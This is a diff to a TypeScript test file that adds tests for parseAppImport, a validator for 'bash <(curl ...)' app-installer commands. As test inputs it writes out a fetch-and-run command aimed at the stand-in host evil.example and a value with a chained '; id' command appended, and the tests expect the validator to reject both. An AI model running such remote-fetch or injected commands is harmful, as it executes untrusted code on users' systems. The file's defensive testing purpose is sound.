@@ -19,6 +19,22 @@ import { detect, findSkills, isSafeSkillName, verify } from '../src/install.ts'
 import { fromUniversal, phaseOf, toUniversal } from '../src/mcpconfig.ts'
 import { parseFrontmatter, rootsFor, scanSkills, setSkillState, stateOf } from '../src/skills.ts'
 import { estimateTokens } from '../src/tokens.ts'
+import { parseAppImport } from '../src/apps.ts'
+
+describe('parseAppImport', () => {
+  it('accepts the signed App command without returning it to a shell', () => {
+    const parsed = parseAppImport("bash <(curl -fsSL 'https://skill.vyibc.com/cartoon-video-studio/release/install-cartoon-video-studio.sh') --bootstrap-token " + 'x'.repeat(32))
+    assert.equal(parsed.slug, 'cartoon-video-studio')
+    assert.equal(parsed.installer, 'https://skill.vyibc.com/cartoon-video-studio/release/install-cartoon-video-studio.sh')
+  })
+
+  it('rejects chaining, unknown hosts and malformed release paths', () => {
+    const token = 'x'.repeat(32)
+    assert.throws(() => parseAppImport(`bash <(curl -fsSL https://evil.example/install.sh) --bootstrap-token ${token}`))
+    assert.throws(() => parseAppImport(`bash <(curl -fsSL https://skill.vyibc.com/a/release/install-b.sh) --bootstrap-token ${token}`))
+    assert.throws(() => parseAppImport(`bash <(curl -fsSL https://skill.vyibc.com/a/release/install-a.sh) --bootstrap-token ${token}; id`))
+  })
+})
 
 describe('parseFrontmatter', () => {
   it('reads a plain block', () => {
@@ -362,7 +378,6 @@ describe('findSkills', () => {
     await rm(root, { recursive: true, force: true })
   })
 })
-
 
 
 
